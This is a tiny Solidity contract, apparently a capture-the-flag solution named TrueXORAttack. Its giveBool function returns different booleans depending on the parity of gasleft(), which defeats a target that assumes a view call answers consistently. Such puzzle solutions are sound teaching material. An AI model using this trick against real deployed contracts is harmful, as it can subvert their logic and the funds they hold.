// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXORAttack is IBoolGiver{
  function giveBool() external view override returns (bool){
    uint i = 0;
    return gasleft()%2 == 0;
  }
}